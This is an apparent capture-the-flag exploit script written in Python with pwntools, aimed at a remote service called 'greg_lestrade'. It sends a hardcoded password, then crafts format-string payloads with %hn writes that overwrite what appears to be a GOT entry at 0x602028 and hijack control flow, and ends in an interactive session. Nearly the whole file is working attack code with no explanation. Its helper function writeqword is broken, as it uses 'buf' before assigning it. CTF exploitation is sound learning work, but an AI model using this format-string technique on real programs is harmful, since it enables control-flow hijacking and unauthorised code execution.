from pwn import * 

#s = process("./greg_lestrade")
s = remote("146.185.132.36", 12431)

s.sendline("7h15_15_v3ry_53cr37_1_7h1nk")

def writeqword(addr, qword):
	s.sendline("1")
	s.clean(1)
	buf += "%40$n\n"
	buf += "A"*0x100
	buf = buf[:0xfe]
	buf += "DD"
	buf += p64(addr)
	buf += p64(addr+8)
	buf += "C"*0x100

	buf = buf[:0x1fe]

	s.sendline(buf)
	buf = s.recvline()

#writeqword(0x602028, 0x400706)

s.sendline("1")

buf = "%42$hn"
buf += "%43$hn"
buf += "%%.%du" % (0x40)
buf += "%41$hn"
buf += "%%.%du" % (0x700-0x40)
buf += "%40$hn"

buf += "A"*0x100
buf = buf[:0xfe]

buf += "A\x00"

buf += p64(0x602028)
buf += p64(0x60202a)
buf += p64(0x60202c)
buf += p64(0x60202e)

print hex(len(buf))

s.sendline(buf)

s.interactive()
